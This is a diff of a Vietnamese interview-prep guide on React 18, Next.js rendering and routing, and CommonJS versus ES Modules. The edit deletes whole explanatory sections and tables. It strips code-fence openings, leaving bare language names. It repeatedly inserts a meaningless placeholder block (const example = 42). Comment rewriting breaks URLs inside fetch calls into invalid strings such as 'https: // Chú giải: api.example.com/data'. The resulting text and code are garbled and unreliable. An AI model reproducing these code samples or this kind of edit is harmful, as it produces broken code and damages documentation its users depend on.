@@ -12890,34 +6396,34 @@ function List() {
     <dd>{item.description}</dd>
   </React.Fragment>
 ))}
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **7.3. startTransition (React 18)**
-
-```typescript
+typescript
 import { startTransition } from 'react';
 
  // Chú giải: Mark state updates as non-urgent
 function TabContainer() {
   const [tab, setTab] = useState('home');
-  
+
   function selectTab(nextTab) {
     startTransition(() => {
       setTab(nextTab); // Chú giải: Low priority
     });
   }
-  
+
  // Chú giải: Input stays responsive even if TabPanel render is slow
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **7.4. React.lazy & Suspense Integration**
-
-```typescript
+typescript
 const OtherComponent = lazy(() => import('./OtherComponent'));
 
 function MyComponent() {
@@ -12934,100 +6440,13 @@ function MyComponent() {
   <ComponentB />
 </Suspense>
  // Chú giải: Waits for BOTH before showing (avoid cascading spinners)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
----
-## 26. ▲ Q26: Next.js - React Framework for Production  
-
-**P1: Tên câu hỏi:** ▲ Q26: Next.js - React Framework for Production  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
-
-**"Next.js là framework React với SSR, SSG, routing và tối ưu hóa tích hợp sẵn.**
-
-**📦 Phương Pháp Render Cốt Lõi (4 Loại):**
-1. **SSR (Server-Side Rendering - Render Phía Server)**: Render HTML mỗi request → dữ liệu mới, SEO tốt. Dùng `getServerSideProps()`.
-   - ✅ Trường hợp: Dashboard, trang cá nhân, dữ liệu thời gian thực.
-   - ⚠️ Đánh đổi: TTFB chậm hơn, tải server cao.
-
-2. **SSG (Static Site Generation - Tạo Trang Tĩnh)**: Render HTML lúc build → phục vụ file tĩnh (cực nhanh). Dùng `getStaticProps()`.
-   - ✅ Trường hợp: Blog, tài liệu, trang marketing (nội dung ít thay đổi).
-   - ✅ Lợi ích: Thân thiện CDN, hiệu năng tốt nhất, SEO tốt.
-
-3. **ISR (Incremental Static Regeneration - Tạo Tĩnh Tăng Dần)**: SSG + tạo lại nền → mẫu stale-while-revalidate.
-   - `revalidate: 60` → tạo lại trang mỗi 60s nếu có request.
-   - ✅ Tốt nhất cả hai: Tốc độ tĩnh + dữ liệu mới.
-
-4. **CSR (Client-Side Rendering - Render Phía Client)**: Lấy dữ liệu trên client (như SPA). Dùng `useSWR` hoặc React Query.
-   - ✅ Trường hợp: Trang riêng tư, dashboard người dùng.
-   - ⚠️ Đánh đổi: Không SEO, tải ban đầu chậm hơn.
-
-**🗂️ App Router vs Pages Router:**
-- **Pages Router (Cũ):**
-  - Routing dựa trên file: `pages/about.tsx` → `/about`.
-  - `getServerSideProps`, `getStaticProps` cho lấy dữ liệu.
-  - Chỉ Client Components.
-
-- **App Router (Next.js 13+):**
-  - Dựa trên thư mục: `app/about/page.tsx` → `/about`.
-  - Server Components mặc định → không có JS bundle.
-  - Layouts, loading, error states tích hợp sẵn.
-  - `async/await` trực tiếp trong components (không cần getServerSideProps).
-  - Routing lồng nhau, parallel routes, intercepting routes.
-
-**⚡ Server Components vs Client Components:**
-- **Server Components**: Render trên server → không gửi JS tới client → tải nhanh hơn, SEO tốt hơn.
-  - Mặc định trong App Router.
-  - Không dùng được hooks (useState, useEffect), browser APIs.
-  - ✅ Trường hợp: Nội dung tĩnh, lấy dữ liệu, trang SEO.
-
-- **Client Components**: Chỉ thị `'use client'` → render trên client → tương tác được.
-  - Dùng được hooks, browser APIs, event handlers.
-  - ✅ Trường hợp: Form, giao diện tương tác, state client.
-
-**🎯 Tính Năng Chính:**
-- **Routing Dựa Trên File**: Không cần config, tự động chia code theo route.
-- **Tối Ưu Hình Ảnh**: Component `<Image>` → tự động resize, lazy load, WebP.
-- **API Routes**: `pages/api/` hoặc `app/api/` → serverless functions.
-- **Middleware**: Chạy code trước khi request hoàn thành → auth, redirects, rewrites.
-- **Chia Code Tự Động**: Chỉ tải JS cho trang hiện tại → tải nhanh hơn.
-
-**⚠️ Lỗi Thường Gặp:**
-- **Lấy dữ liệu trong useEffect (CSR) khi có thể dùng SSR/SSG**: Bỏ lỡ lợi ích SEO.
-- **Không dùng `next/image`**: Bỏ lỡ tối ưu tự động (resize, lazy load, WebP).
-- **Hardcode URLs**: Dùng `next/link` + `next/router` cho SPA navigation.
-- **Không tối ưu fonts**: Dùng `next/font` cho tối ưu font tự động.
-
-**💡 Kiến Thức Senior:**
-- **Rendering Hỗn Hợp**: Kết hợp SSR + SSG + CSR trong cùng app → chọn phương pháp cho từng trang.
-- **Edge Runtime**: Deploy middleware/API routes trên Edge → độ trễ thấp toàn cầu.
-- **Streaming SSR**: React 18 + App Router → stream HTML chunks → TTFB nhanh hơn.
-- **Partial Prerendering**: Next.js 14+ → vỏ tĩnh + nội dung động streamed.
-- **Turbopack**: Next.js 13+ dev server → bundler dựa trên Rust → nhanh hơn Webpack 700 lần.
-
-**🚀 Mẹo Hiệu Năng:**
-- **Prefetching**: `<Link>` tự động prefetch khi hover → chuyển trang tức thì.
-- **Import Động**: `next/dynamic` để chia code → tải components theo yêu cầu.
-- **Caching**: `revalidate` cho ISR, headers `Cache-Control` cho API routes.
-- **Phân Tích**: Báo cáo Web Vitals tích hợp → theo dõi hiệu năng người dùng thực.
-
----
-
-**🎯 Next.js là gì:**
-- React framework for production với built-in routing, SSR, SSG, API routes
-- Tối ưu performance, SEO, developer experience
-- Zero-config, file-based routing, automatic code splitting
-
-#### **📚 PHẦN 1: CORE FEATURES**
-
-##### **1.1. Rendering Methods**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: 1. SSR - Server-Side Rendering (mỗi request)
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -13035,7 +6454,7 @@ function MyComponent() {
 export async function getServerSideProps(context) {
   const res = await fetch('https: // Chú giải: api.example.com/data');
   const data = await res.json();
-  
+
   return {
     props: { data }, // Chú giải: Passed to page component
   };
@@ -13055,7 +6474,7 @@ function Page({ data }) {
 export async function getStaticProps() {
   const res = await fetch('https: // Chú giải: api.example.com/posts');
   const posts = await res.json();
-  
+
   return {
     props: { posts },
     revalidate: 60, // ISR: Re-generate mỗi 60s nếu có request
@@ -13066,11 +6485,11 @@ export async function getStaticProps() {
 export async function getStaticPaths() {
   const res = await fetch('https: // Chú giải: api.example.com/posts');
   const posts = await res.json();
-  
+
   const paths = posts.map(post => ({
     params: { id: post.id.toString() },
   }));
-  
+
   return {
     paths, // Pre-render những paths này
     fallback: 'blocking', // Chú giải: 'blocking' | true | false
@@ -13085,7 +6504,7 @@ export async function getStaticPaths() {
  // Chú giải: ══════════════════════════════════════════════════════════
 export async function getStaticProps() {
   const data = await fetchData();
-  
+
   return {
     props: { data },
     revalidate: 10, // Chú giải: Re-generate page mỗi 10s (stale-while-revalidate)
@@ -13105,31 +6524,22 @@ import useSWR from 'swr';
 
 function Profile() {
   const { data, error } = useSWR('/api/user', fetcher);
-  
+
   if (error) return <div>Failed to load</div>;
   if (!data) return <div>Loading...</div>;
-  
+
   return <div>Hello {data.name}</div>;
 }
 
 // ✅ Khi nào dùng: Private pages, dashboards, user-specific data
 // ⚠️ Nhược điểm: Không tốt cho SEO, slower initial load
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**📊 So sánh Rendering Methods:**
-
-| Method | Build Time | Request Time | SEO | Speed | Use Case |
-|--------|-----------|--------------|-----|-------|----------|
-| **SSG** | Generate HTML | Serve static | ⭐⭐⭐ | ⭐⭐⭐ | Blog, docs |
-| **ISR** | Generate HTML | Serve static + revalidate | ⭐⭐⭐ | ⭐⭐⭐ | E-commerce |
-| **SSR** | - | Generate HTML | ⭐⭐⭐ | ⭐⭐ | Real-time data |
-| **CSR** | - | Fetch on client | ⭐ | ⭐ | Dashboards |
-
----
-
-##### **1.2. File-Based Routing**
-
-```typescript
+typescript
  // Chú giải: pages/index.tsx → /
  // Chú giải: pages/about.tsx → /about
  // Chú giải: pages/blog/[slug].tsx → /blog/:slug (dynamic)
@@ -13143,7 +6553,7 @@ import { useRouter } from 'next/router';
 function Post() {
   const router = useRouter();
   const { id } = router.query; // Chú giải: Get dynamic param
-  
+
   return <div>Post: {id}</div>;
 }
 
@@ -13152,7 +6562,7 @@ function Post() {
 function Docs() {
   const router = useRouter();
   const { slug } = router.query; // Chú giải: slug = ['a', 'b', 'c']
-  
+
   return <div>Path: {slug?.join('/')}</div>;
 }
 
@@ -13162,13 +6572,13 @@ router.push('/about'); // Chú giải: Client-side navigation
 router.push({ pathname: '/post/[id]', query: { id: '1' } });
 router.replace('/login'); // Chú giải: Replace history
 router.back(); // Chú giải: Go back
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.3. API Routes**
-
-```typescript
+typescript
  // Chú giải: pages/api/user.ts
 import type { NextApiRequest, NextApiResponse } from 'next';
 
@@ -13198,13 +6608,13 @@ export default function handler(req, res) {
 }
 
  // Chú giải: ✅ Use cases: Backend logic, database queries, authentication
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **1.4. Image Optimization**
-
-```typescript
+typescript
 import Image from 'next/image';
 
  // Chú giải: Automatic optimization, lazy loading, responsive
@@ -13238,15 +6648,13 @@ function Avatar() {
  // Chú giải: - Lazy loading (viewport intersection)
  // Chú giải: - Responsive images (srcset)
  // Chú giải: - Prevent layout shift (width/height required)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📚 PHẦN 2: ADVANCED FEATURES**
-
-##### **2.1. Middleware (Next.js 12+)**
-
-```typescript
+typescript
  // Chú giải: middleware.ts (root level)
 import { NextResponse } from 'next/server';
 import type { NextRequest } from 'next/server';
@@ -13255,21 +6663,21 @@ import type { NextRequest } from 'next/server';
 export function middleware(request: NextRequest) {
  // Chú giải: Authentication
   const token = request.cookies.get('token');
-  
+
   if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
     return NextResponse.redirect(new URL('/login', request.url));
   }
-  
+
  // Chú giải: A/B Testing
   const bucket = request.cookies.get('bucket') || Math.random() > 0.5 ? 'a' : 'b';
   const response = NextResponse.next();
   response.cookies.set('bucket', bucket);
-  
+
   // Rewrite (thay đổi URL nội bộ)
   if (request.nextUrl.pathname === '/old-blog') {
     return NextResponse.rewrite(new URL('/blog', request.url));
   }
-  
+
   return response;
 }
 
@@ -13277,13 +6685,13 @@ export function middleware(request: NextRequest) {
 export const config = {
   matcher: ['/dashboard/:path*', '/api/:path*'],
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **2.2. App Router (Next.js 13+ - New)**
-
-```typescript
+typescript
  // Chú giải: app/layout.tsx - Root layout
 export default function RootLayout({ children }) {
   return (
@@ -13323,13 +6731,13 @@ export default function Counter() {
   const [count, setCount] = useState(0);
   return <button onClick={() => setCount(count + 1)}>{count}</button>;
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **2.3. Data Fetching (App Router)**
-
-```typescript
+typescript
  // Chú giải: Fetch with caching
 async function getData() {
   const res = await fetch('https: // Chú giải: api.example.com/data', {
@@ -13360,18 +6768,16 @@ export default async function Page() {
     fetch('/api/user').then(r => r.json()),
     fetch('/api/posts').then(r => r.json()),
   ]);
-  
+
   return <div>{user.name} - {posts.length} posts</div>;
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📚 PHẦN 3: SEO OPTIMIZATION**
-
-##### **3.1. Metadata & SEO**
-
-```typescript
+typescript
  // Chú giải: pages/index.tsx (Pages Router)
 import Head from 'next/head';
 
@@ -13411,7 +6817,7 @@ export const metadata: Metadata = {
  // Chú giải: Dynamic metadata
 export async function generateMetadata({ params }): Promise<Metadata> {
   const product = await fetch(`/api/products/${params.id}`).then(r => r.json());
-  
+
   return {
     title: product.name,
     description: product.description,
@@ -13420,13 +6826,13 @@ export async function generateMetadata({ params }): Promise<Metadata> {
     },
   };
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **3.2. SEO Best Practices**
-
-```typescript
+typescript
  // Chú giải: 1. Sitemap Generation (pages/api/sitemap.xml.ts)
 export default function Sitemap() {
  // Chú giải: Generate sitemap XML
@@ -13462,35 +6868,13 @@ export default function Sitemap() {
  // Chú giải: 6. Internal Linking
 import Link from 'next/link';
 <Link href="/about">About</Link> // Chú giải: Prefetch on hover
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📚 PHẦN 4: ƯU & NHƯỢC ĐIỂM**
-
-**✅ Ưu điểm:**
-
-1. **SEO Excellent**: SSR/SSG → Search engines index easily
-2. **Performance**: Automatic code splitting, image optimization, font optimization
-3. **Developer Experience**: Hot reload, TypeScript support, zero config
-4. **Flexibility**: SSG, SSR, ISR, CSR - chọn per page
-5. **Built-in Features**: Routing, API routes, image optimization, i18n
-6. **Production Ready**: Vercel deployment, edge functions, analytics
-
-**⚠️ Nhược điểm:**
-
-1. **Learning Curve**: Nhiều concepts (SSR, SSG, ISR, hydration)
-2. **Opinionated**: File-based routing, specific structure
-3. **Build Time**: SSG với nhiều pages → long build time
-4. **Server Costs**: SSR requires server (không thể pure static hosting)
-5. **Vendor Lock-in**: Best với Vercel, other platforms cần config thêm
-6. **Bundle Size**: Framework overhead (though optimized)
-
----
-
-#### **📚 PHẦN 5: PERFORMANCE OPTIMIZATION**
-
-```typescript
+typescript
  // Chú giải: 1. Dynamic Imports (Code Splitting)
 import dynamic from 'next/dynamic';
 
@@ -13530,17 +6914,13 @@ export default function Page() {
     </Suspense>
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📚 PHẦN 6: NEXT.JS 14 vs 15 vs 16 - SỰ KHÁC BIỆT**
-
-##### **6.1. Next.js 14 (October 2023)**
-
-**🎯 Key Features:**
-
-```typescript
+typescript
  // Chú giải: 1. Turbopack (Beta) - Faster dev server
  // Chú giải: next.config.js
 module.exports = {
@@ -13581,21 +6961,13 @@ export const metadata = {
     languages: { 'en-US': '/en-US', 'vi-VN': '/vi-VN' },
   },
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**📊 Next.js 14 Highlights:**
-- ✅ Turbopack dev mode (53% faster)
-- ✅ Server Actions stable
-- ✅ Partial Prerendering preview
-- ✅ Improved `next/image`
-
----
-
-##### **6.2. Next.js 15 (October 2024)**
-
-**🎯 Key Features:**
-
-```typescript
+typescript
  // Chú giải: 1. React 19 Support
  // Chú giải: - React Compiler (automatic memoization)
  // Chú giải: - New hooks: useFormStatus, useOptimistic
@@ -13636,23 +7008,13 @@ function SubmitButton() {
   const { pending } = useFormStatus();
   return <button disabled={pending}>Submit</button>;
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**📊 Next.js 15 Highlights:**
-- ✅ React 19 RC support
-- ✅ Async request APIs (breaking)
-- ✅ Caching opt-in (breaking)
-- ✅ Turbopack stable in dev
-- ✅ Better hydration errors
-- ⚠️ Breaking changes from 14
-
----
-
-##### **6.3. Next.js 16 (Expected Q1 2025)**
-
-**🎯 Expected Features (Based on Roadmap):**
-
-```typescript
+typescript
  // Chú giải: 1. Turbopack Build (Production)
  // Chú giải: Currently dev-only, production builds will use Turbopack
  // Chú giải: Faster builds, less memory usage
@@ -13666,12 +7028,12 @@ export default async function Product({ params }) {
   return (
     <div>
       <h1>Product {params.id}</h1>
-      
+
       {/* Dynamic content loads after */}
       <Suspense fallback={<Skeleton />}>
         <ProductDetails id={params.id} />
       </Suspense>
-      
+
       <Suspense fallback={<Skeleton />}>
         <Reviews id={params.id} />
       </Suspense>
@@ -13694,37 +7056,13 @@ function Component({ items }) {
  // Chú giải: 5. Edge Runtime Enhancements
  // Chú giải: More Node.js APIs available in Edge Runtime
  // Chú giải: Better compatibility with existing packages
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**📊 Next.js 16 Expected Features:**
-- ✅ Turbopack production builds
-- ✅ PPR stable (game-changer for performance)
-- ✅ React Compiler default
-- ✅ Better streaming & hydration
-- ✅ Edge Runtime maturity
-
----
-
-##### **6.4. Comparison Table: Next.js 14 vs 15 vs 16**
-
-| Feature | Next.js 14 | Next.js 15 | Next.js 16 (Expected) |
-|---------|-----------|-----------|---------------------|
-| **React Version** | 18 | 19 RC | 19 Stable |
-| **Turbopack Dev** | Beta | ✅ Stable | ✅ Stable |
-| **Turbopack Build** | ❌ | ❌ | ✅ Stable |
-| **Server Actions** | ✅ Stable | ✅ Stable | ✅ Enhanced |
-| **PPR** | Preview | Experimental | ✅ Stable |
-| **Request APIs** | Sync | ⚠️ Async (breaking) | Async |
-| **Caching** | Default ON | ⚠️ Default OFF (breaking) | Opt-in |
-| **React Compiler** | ❌ | Experimental | ✅ Default |
-| **Hydration Errors** | Basic | ✅ Improved | Enhanced |
-| **Edge Runtime** | Basic | Improved | ✅ Mature |
-
----
-
-##### **6.5. Migration Guide: 14 → 15 → 16**
-
-```typescript
+typescript
  // Chú giải: ══════════════════════════════════════════════════════════
  // Chú giải: NEXT 14 → 15 (Breaking Changes)
  // Chú giải: ══════════════════════════════════════════════════════════
@@ -13773,183 +7111,49 @@ const callback = () => handleClick(); // Chú giải: Auto-memoized
     "build": "next build" // Chú giải: Uses Turbopack automatically
   }
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-##### **6.6. Khi nào nên upgrade?**
-
-**📌 Next.js 14:**
-- ✅ Production-ready, stable
-- ✅ Good for existing projects
-- ✅ Server Actions stable
-- ⚠️ Will need migration to 15 eventually
-
-**📌 Next.js 15:**
-- ✅ Latest stable (as of Oct 2024)
-- ✅ React 19 RC support
-- ✅ Better DX (Turbopack, hydration errors)
-- ⚠️ Breaking changes from 14
-- ⚠️ Caching behavior changes need attention
-
-**📌 Next.js 16:**
-- 🔮 Not released yet (Q1 2025)
-- ✅ Wait for: PPR stable, Turbopack build, React Compiler
-- ⚠️ Early adoption may have bugs
-
-**💡 Recommendation:**
-- **New projects**: Next.js 15 (latest stable)
-- **Existing projects**: Stay on 14 until 15.1+ (bug fixes)
-- **Enterprise**: Wait for 15.2+ or LTS versions
-
----
-
-#### **🎯 TÓM TẮT Q40 - NEXT.JS**
-
-**✅ Core Features:**
-- **Rendering**: SSR, SSG, ISR, CSR - chọn per page
-- **Routing**: File-based, dynamic routes, API routes
-- **Optimization**: Image, font, script automatic optimization
-- **SEO**: Built-in metadata API, sitemap, structured data
-
-**💡 SEO Techniques:**
-1. SSR/SSG cho better indexing
-2. Metadata API (title, description, OG tags)
-3. Structured data (JSON-LD)
-4. Image optimization với alt text
-5. Sitemap & robots.txt
-6. Internal linking với Link component
-
-**🚀 Khi nào dùng Next.js:**
-- Cần SEO (blog, e-commerce, marketing)
-- Performance-critical apps
-- Full-stack React apps (API routes)
-- Static sites với dynamic features
-
----
----
-## 27. 📦 Q27: CommonJS vs ES Modules (ESM) & Bundling Deep Dive  
-
-**P1: Tên câu hỏi:** 📦 Q27: CommonJS vs ES Modules (ESM) & Bundling Deep Dive  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
-
-**"CommonJS (CJS) là hệ thống module Node.js (đồng bộ, runtime). ESM là chuẩn JavaScript (bất đồng bộ, phân tích tĩnh).**
-
-**📊 CommonJS (CJS) - Node.js Cũ:**
-- **Cú pháp**: `require()` import, `module.exports` export.
-- **Tải**: Đồng bộ (chặn) → tốt cho server, không tốt cho trình duyệt.
-- **Thực thi**: Đánh giá runtime → imports động (có điều kiện, đường dẫn tính toán).
-- **Caching**: Module được cache sau lần require đầu → mẫu singleton.
-- **Scope**: Dựa trên file, scope module cô lập.
-- **Phần mở rộng**: `.js`, `.cjs`.
-- ✅ Trường hợp: Backend Node.js, gói npm cũ.
-
-**🎯 ES Modules (ESM) - Chuẩn Hiện Đại:**
-- **Cú pháp**: Câu lệnh `import/export`.
-- **Tải**: Bất đồng bộ (không chặn) → tốt cho trình duyệt.
-- **Thực thi**: Phân tích tĩnh → phân giải compile-time → tree-shaking (loại bỏ code chết).
-- **Strict Mode**: Chế độ strict mặc định.
-- **Phần mở rộng**: `.mjs`, `.js` (với `"type": "module"` trong package.json).
-- ✅ Trường hợp: Trình duyệt hiện đại, Node.js 12+, frameworks frontend.
-
-**🔑 Khác Biệt Chính:**
-| Tính Năng | CommonJS | ESM |
-|-----------|----------|-----|
-| **Tải** | Đồng bộ | Bất đồng bộ |
-| **Cú pháp** | `require()`, `module.exports` | `import`, `export` |
-| **Phân tích** | Runtime (động) | Compile-time (tĩnh) |
-| **Tree-shaking** | ❌ Không hỗ trợ | ✅ Hỗ trợ (bundlers) |
-| **Top-level await** | ❌ Không hỗ trợ | ✅ Hỗ trợ (ES2022) |
-| **Trình duyệt** | ❌ Cần bundler | ✅ Hỗ trợ native |
-| **Dynamic import** | `require(variable)` | Hàm `import()` |
-| **Hoisting** | Không hoist | Hoist (imports đầu file) |
-
-**🚀 Tree-Shaking (Loại Bỏ Code Chết):**
-- **Khái niệm**: Bundlers (Webpack, Rollup) phân tích ESM imports → xóa exports không dùng → bundle nhỏ hơn.
-- **Tại sao chỉ ESM**: Imports tĩnh → bundler biết chính xác code nào được dùng (compile-time).
-- **Hạn chế CJS**: Require động → bundler không biết code nào sẽ dùng (runtime) → phải bao gồm tất cả.
-
-**🔧 Interop (CJS ↔ ESM):**
-- **ESM import CJS**: `import cjsModule from 'cjs-package'` → default export = `module.exports`.
-- **CJS require ESM**: Không thể synchronous require ESM → phải dùng dynamic `import()`.
-  ```js
+js
  // Chú giải: CJS file
   (async () => {
     const esmModule = await import('./esm-file.mjs');
   })();
-  ```
-- **Dual packages**: Publish cả CJS và ESM versions (`.cjs`, `.mjs`) với `exports` field trong package.json.
 
-**⚠️ Common Pitfalls:**
-- **Named imports từ CJS**: CJS không có named exports thật.
-  ```js
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+js
  // Chú giải: CJS
   module.exports = { foo: 1 };
  // Chú giải: ESM import
   import { foo } from 'cjs-module'; // ❌ Không work! (Node.js synthetic support)
   import cjs from 'cjs-module'; // Chú giải: ✅ cjs = { foo: 1 }
   const { foo } = cjs;
-  ```
-- **File extensions**: ESM trong browser cần `.js` extension trong imports. Node.js không cần (resolve algorithm).
-- **`__dirname`, `__filename`**: Không tồn tại trong ESM → dùng `import.meta.url`.
-  ```js
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+js
  // Chú giải: CJS
   console.log(__dirname);
  // Chú giải: ESM
   import { fileURLToPath } from 'url';
   const __dirname = fileURLToPath(new URL('.', import.meta.url));
-  ```
 
-**💡 Senior Insights:**
-- **Migration strategy**: Dual publish (CJS + ESM) cho libraries → backward compatibility.
-- **Bundlers**: Webpack, Rollup, esbuild prefer ESM → better tree-shaking, faster builds.
-- **Node.js**: ESM stable since v12, recommended cho new projects.
-- **Package.json `type` field**: `"type": "module"` → `.js` files treated as ESM. Default = CJS.
-- **Performance**: ESM parsing faster (static analysis), nhưng CJS caching có thể faster trong một số cases.
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
----
-
-**Trả lời:**
-
-**🎯 Core Concepts:**
-
-**1. CommonJS (CJS) - Node.js Module System:**
-- **Syntax**: `require()` để import, `module.exports` để export
-- **Loading**: Synchronous (đồng bộ), blocking I/O
-- **Execution**: Runtime evaluation, dynamic imports
-- **Scope**: File-based, isolated module scope
-- **Extension**: `.js`, `.cjs`
-- **Use Case**: Node.js backend, legacy packages
-
-**2. ES Modules (ESM) - JavaScript Standard:**
-- **Syntax**: `import/export` statements
-- **Loading**: Asynchronous (bất đồng bộ), non-blocking
-- **Execution**: Static analysis, compile-time resolution
-- **Scope**: Module scope với strict mode mặc định
-- **Extension**: `.mjs`, `.js` (với `"type": "module"` trong package.json)
-- **Use Case**: Modern browsers, Node.js (v12+), frontend frameworks
-
-**✅ Ưu điểm ESM:**
-- **Static Analysis**: Bundlers có thể tree-shake dead code tại compile time
-- **Async Loading**: Không block main thread, tốt cho performance
-- **Browser Native**: Modern browsers hỗ trợ native, không cần bundler cho dev
-- **Explicit Dependencies**: Import statements rõ ràng, dễ trace
-- **Named Exports**: Hỗ trợ multiple exports từ một file
-
-**⚠️ Nhược điểm ESM:**
-- **Backward Compatibility**: Không chạy trên legacy browsers
-- **File Extensions Required**: Phải specify `.js` extension trong imports (browser)
-- **CORS Issues**: Cần proper headers khi load từ CDN
-- **Debugging**: Source maps cần thiết cho bundled code
-
-**Code Example - CommonJS vs ESM:**
-
-```typescript
+typescript
  // Chú giải: ============================================
  // Chú giải: COMMONJS (Node.js Traditional)
  // Chú giải: ============================================
@@ -14032,9 +7236,13 @@ if (condition) {
  // Chú giải: ============================================
  // Chú giải: BROWSER USAGE - Native ESM
  // Chú giải: ============================================
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-```html
+html
 <!-- index.html - Browser Native ESM -->
 <!DOCTYPE html>
 <html>
@@ -14044,7 +7252,7 @@ if (condition) {
 <body>
   <!-- Traditional script (no modules) -->
   <script src="./legacy.js"></script>
-  
+
   <!-- ESM - type="module" enables import/export -->
   <script type="module">
  // Chú giải: Import từ local file
@@ -14071,7 +7279,7 @@ if (condition) {
  // Chú giải: }
  // Chú giải: }
  // Chú giải: </script>
-    
+
  // Chú giải: Then import như package name
  // Chú giải: import _ from 'lodash';
   </script>
@@ -14081,27 +7289,29 @@ if (condition) {
   <link rel="modulepreload" href="./heavy-feature.js">
 </body>
 </html>
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Vietnamese Explanation - Cách Hoạt Động:**
-
-```typescript
+typescript
  // Chú giải: ============================================
  // Chú giải: COMMONJS LOADING MECHANISM
  // Chú giải: ============================================
 /**
  * Vietnamese Explanation:
- * 
+ *
  * 1. SYNCHRONOUS LOADING (Đồng Bộ):
  *    - require() đọc file NGAY LẬP TỨC
  *    - Block execution cho đến khi file loaded
  *    - Cached sau lần đầu (module.exports object được cache)
- * 
+ *
  * 2. RUNTIME EVALUATION:
  *    - Code trong module được execute ngay khi require()
  *    - Dynamic imports allowed (require với string variable)
  *    - Conditional requires allowed
- * 
+ *
  * 3. CACHING:
  *    - Module chỉ execute MỘT LẦN
  *    - Các lần require() sau return cached exports
@@ -14123,22 +7333,22 @@ console.log(a1 === a2); // Tham chiếu: biến chứa địa chỉ tới object
  // Chú giải: ============================================
 /**
  * Vietnamese Explanation:
- * 
+ *
  * 1. ASYNCHRONOUS LOADING (Bất Đồng Bộ):
  *    - import statements parsed trước khi execution
  *    - Browser fetch modules parallel, không block
  *    - Modules execute theo dependency order
- * 
+ *
  * 2. STATIC ANALYSIS:
  *    - Import/export phải là static strings (không thể dùng variables)
  *    - Bundlers có thể analyze dependencies tại build time
  *    - Tree-shaking possible (remove unused exports)
- * 
+ *
  * 3. MODULE GRAPH:
  *    - Browser xây dựng dependency graph
  *    - Fetch → Parse → Instantiate → Evaluate
  *    - Mỗi module chỉ evaluate MỘT LẦN
- * 
+ *
  * 4. LIVE BINDINGS:
  *    - Imported values là REFERENCES, không phải copies
  *    - Changes trong export module reflect trong import
@@ -14167,7 +7377,7 @@ console.log(count); // Chú giải: 1 - live binding updated!
  // Chú giải: ============================================
 /**
  * Vietnamese Explanation:
- * 
+ *
  * ESBuild là extremely fast bundler viết bằng Go
  * - 10-100x nhanh hơn Webpack/Rollup
  * - Built-in TypeScript support
@@ -14189,18 +7399,18 @@ await esbuild.build({
   target: 'es2020', // Chú giải: Target environment
   format: 'esm', // Chú giải: Output format: 'esm' | 'cjs' | 'iife'
   platform: 'browser', // Chú giải: 'browser' | 'node' | 'neutral'
-  
+
  // Chú giải: Tree-shaking configuration
   treeShaking: true,
-  
+
   // External dependencies (không bundle)
   external: ['react', 'react-dom'],
-  
+
  // Chú giải: Define global constants
   define: {
     'process.env.NODE_ENV': '"production"',
   },
-  
+
  // Chú giải: Plugin system
   plugins: [],
 });
@@ -14246,7 +7456,7 @@ await ctx.serve({ port: 3000 }); // Chú giải: Serve với dev server
  // Chú giải: ============================================
 /**
  * Vietnamese Explanation:
- * 
+ *
  * Tree-shaking = Dead Code Elimination
  * - Bundler analyze import/export graph
  * - Remove unused exports từ final bundle
@@ -14300,7 +7510,7 @@ export function myFunction() {
  // Chú giải: ============================================
 /**
  * Vietnamese Explanation:
- * 
+ *
  * Code Splitting = Tách code thành nhiều bundles
  * - Initial bundle: Core functionality
  * - Lazy chunks: Load on-demand
@@ -14347,7 +7557,7 @@ document.addEventListener('DOMContentLoaded', () => {
  // Chú giải: ============================================
 /**
  * Vietnamese Explanation:
- * 
+ *
  * Mixing CommonJS và ESM có thể tricky
  * - ESM có thể import CJS (Node.js tự convert)
  * - CJS KHÔNG thể synchronously require ESM
@@ -14374,7 +7584,7 @@ const esmModule = require('./esm-module.mjs'); // Chú giải: ❌ Error!
   "name": "my-package",
   "version": "1.0.0",
   "type": "module", // Chú giải: Default to ESM
-  
+
  // Chú giải: Exports field (Node.js 12+)
   "exports": {
     ".": {
@@ -14386,35 +7596,24 @@ const esmModule = require('./esm-module.mjs'); // Chú giải: ❌ Error!
       "require": "./dist/utils.cjs"
     }
   },
-  
+
  // Chú giải: Fallback for older tools
   "main": "./dist/index.cjs", // Chú giải: CJS entry
   "module": "./dist/index.mjs", // Chú giải: ESM entry
-  
+
  // Chú giải: TypeScript types
   "types": "./dist/index.d.ts",
-  
+
